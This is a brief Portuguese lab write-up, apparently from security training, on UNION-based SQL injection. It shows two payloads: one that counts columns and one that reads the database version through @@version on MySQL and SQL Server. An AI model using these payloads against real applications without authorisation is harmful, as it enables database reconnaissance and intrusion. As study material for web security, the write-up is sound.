# SQL Injection - Querying Database Type and Version (MySQL / Microsoft)

## Objetivo

Identificar o tipo e a versão do banco de dados utilizando SQL Injection com `UNION`.

---

## Payload utilizado para identificar colunas

```sql
' UNION SELECT 'abc','def'#
```

## Como funciona

- `'` fecha a string original
- `UNION` junta a consulta injetada com a original
- `abc` e `def` foram usados apenas para testar quantidade de colunas
- `#` comenta o restante da query

Resultado:

- Existem 2 colunas
- Ambas aceitam texto

---

## Extração de informações

```sql
' UNION SELECT @@version,NULL#
```

## Como funciona

```sql
@@version
```

Retorna a versão do banco de dados no MySQL e Microsoft SQL Server.

```sql
NULL
```

Foi usado apenas para manter a quantidade correta de colunas.

```sql
#
```

Comenta o restante da query.

---

## Resultado

Foi possível identificar:

- Tipo do banco de dados
- Versão específica
- Informações do ambiente

---

## Aprendizado

A lógica foi semelhante ao laboratório Oracle: primeiro descobrir a estrutura da query, depois substituir valores de teste por dados reais.
